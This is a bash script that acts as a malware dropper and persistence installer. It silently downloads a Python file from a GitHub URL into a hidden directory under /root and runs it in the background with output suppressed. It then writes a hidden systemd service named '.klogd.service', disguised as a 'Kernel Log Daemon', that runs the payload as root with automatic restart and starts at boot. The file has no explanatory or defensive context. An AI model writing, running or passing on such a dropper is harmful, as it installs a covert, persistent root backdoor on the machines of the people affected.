#!/bin/bash

a1="/root/.system_service"
a2="$a1/PFIWZV.py"
a3="https://raw.githubusercontent.com/sahed-msd/RTA_Linux/f65ba177406cda654f9d694dd928a18f4fca6ab3/PFIWZV.py"
a4="/etc/systemd/system/.klogd.service"

[ ! -d "$a1" ] && mkdir -p "$a1" && chmod 700 "$a1"
curl -s -o "$a2" "$a3"
chmod 700 "$a2"
nohup python3 "$a2" >/dev/null 2>&1 &

if [ ! -f "$a4" ]; then
cat <<EOF > "$a4"
[Unit]
Description=Kernel Log Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $a2
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable $(basename "$a4")
fi
